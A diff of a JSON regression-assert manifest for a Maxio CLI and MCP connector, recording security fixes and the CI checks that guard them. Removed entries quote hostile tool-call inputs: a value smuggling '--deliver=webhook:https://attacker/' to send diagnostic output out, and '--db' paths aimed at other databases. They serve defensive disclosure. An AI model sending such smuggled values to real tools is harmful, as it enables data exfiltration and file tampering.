@@ -14,16 +14,12 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
      "file": "cli/internal/cli/doctor.go",
      "contains": "doctorIsInfoKey(k)"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
     },
     {
      "file": "cli/internal/cli/doctor.go",
@@ -36,6 +32,48 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(doctorBase)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedTemplate(doctorBase)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedTemplate(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -124,103 +162,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "no-create-alias-on-destructive-commands",
    "class": "create-alias-on-destructive",
    "summary": "The generator's hidden Cobra alias `create` is removed from the 16 commands listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs them",
@@ -301,251 +242,1496 @@
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Maxio state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/maxio_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to maxio from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the domotz 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
    "asserts": [
     {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
+     "file": "cli/internal/mcp/cobratree/maxio_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/maxio_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
      "min_count": 1,
      "code_only": true
     }
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section: which host gets which credential, withheld output, the 0600 store, dry run, MCP confirm.",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to maxio from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the domotz 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
+     "file": "README.md",
+     "contains": "## Credential safety"
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A --dry-run write never reaches Maxio, from the CLI and from a cold start.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to maxio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the domotz 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
+     "contains": "c.DryRun",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/maxio_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Maxio: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to maxio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the domotz 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/maxio_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/maxio_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its output file on every return, including an API error: the open no longer shadows the named err of RunE.",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to maxio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to maxio from the domotz 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
      "min_count": 1,
      "code_only": true
     },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "outKit.Close()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "site-origin-pinned",
+   "summary": "The kit sees the resolved templated base URL (https://{site}.chargify.com with MAXIO_SITE filled in) as the one API origin, and a site that is not one DNS label shows noSiteOrigin, so no credential is sent anywhere.",
+   "why": "The ported guard pinned url.Parse(c.BaseURL); the unresolved {site} template does not parse, so the pin would be empty and every request refused. pinnedOrigin resolves the template first and refuses a site that could change the host (a dot, a slash, an @); a site changed after the client is built (sync --path-context, an MCP argument) cannot move the key. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var siteLabel =",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "noSiteOrigin",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestSiteNeverMovesTheKey(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "events-site-resolved",
+   "summary": "events record and bulk-record-events post to https://events.chargify.com/<MAXIO_SITE>/events/..., and that host is the one allowed origin besides the API base.",
+   "why": "The Events-Based Billing operations declare their own server https://events.chargify.com/{site}; the press bakes the variable's DEFAULT into the command path (https://events.chargify.com/subdomain/events/...; 4.24 shipped it too, and dropping the variable strips it), so every event went to the site 'subdomain', and the origin pin would refuse the events host outright. The generated paths keep {site} (tools/apply_edits.py events-site-resolved: events_record.go, events_bulk-json_bulk-record-events.go, internal/mcp/code_orch.go) and the client resolves it from MAXIO_SITE; pinsFor admits exactly the clean /<site>/events/ path prefix there (another site, dot segments, escaped paths, a custom MAXIO_BASE_URL: refused). (maxio 4.34.2 reprint)",
+   "spec_encode_followup": "Teach the press to keep an operation-level server variable that shares a name with a global template variable as a runtime placeholder instead of baking its default into the command path.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/events_record.go",
+     "contains": "path := \"https://events.chargify.com/{site}/events/{api_handle}.json\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/events_bulk-json_bulk-record-events.go",
+     "contains": "path := \"https://events.chargify.com/{site}/events/{api_handle}/bulk.json\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "\"https://events.chargify.com/{site}/events/{api_handle}.json\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "\"https://events.chargify.com/{site}/events/{api_handle}/bulk.json\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/events_record.go",
+     "not_contains": "events.chargify.com/subdomain"
+    },
+    {
+     "file": "cli/internal/cli/events_bulk-json_bulk-record-events.go",
+     "not_contains": "events.chargify.com/subdomain"
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "not_contains": "events.chargify.com/subdomain"
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"https://events.chargify.com\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestOriginsAreTheSiteAndTheEventsHost(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "maxio-credential-names-exact",
+   "status": "active",
+   "summary": "Of every Maxio spec name, exactly Authorization, the card and bank fields (full_number, cvv, bank_account_number, bank_iban), the single-use payment tokens (chargify_token, payment_method_nonce), the vault references, the self-service page token and the webhook signatures read as credentials; billing data under names that look like credentials (an event key, a masked_card_number, last_four, uniqueness_token, stored_credential_transaction_id) never does. The rule is cliutil.SecretFieldName; the kit declarations are checked against it.",
+   "why": "The ported rule set carried domotz's names (SNMP communities as bare read/write, inventory key, activity-log user) and missed Maxio's: a card number, CVV, bank account number or IBAN an operator types into a payment-profile or signup request printed in --dry-run previews and the maxio_execute preview, while Event.key (payment_success) and the ACH authorizer's name were withheld. The names are pinned against the spec (testdata/maxio-spec-names.json, 832 names) in both directions, and any name the vendor DESCRIBES as a credential must read as one or be reviewed public. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/maxio_credential_names.go",
+     "contains": "func SecretFieldName(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/maxio_credential_names_test.go",
+     "contains": "func TestNoMaxioSpecNameReadsAsACredential(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestCredentialFlagsMatchTheNameRule(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestCredentialFieldsMatchTheNameRule(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestMaxioPublicFieldsAreNotHeld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "basic-constant-password-public",
+   "status": "active",
+   "summary": "The documented Basic password x is never held: the client holds the API key half of the built header and not the password, header:authorization is an exempt identifier, and MAXIO_PASSWORD=x is not held while any other value is.",
